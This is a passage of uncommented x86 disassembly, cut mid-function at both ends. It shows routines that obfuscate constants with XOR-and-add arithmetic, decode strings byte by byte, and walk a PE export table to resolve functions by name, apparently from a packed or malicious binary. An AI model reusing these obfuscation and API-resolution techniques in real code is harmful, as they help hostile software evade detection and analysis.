  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
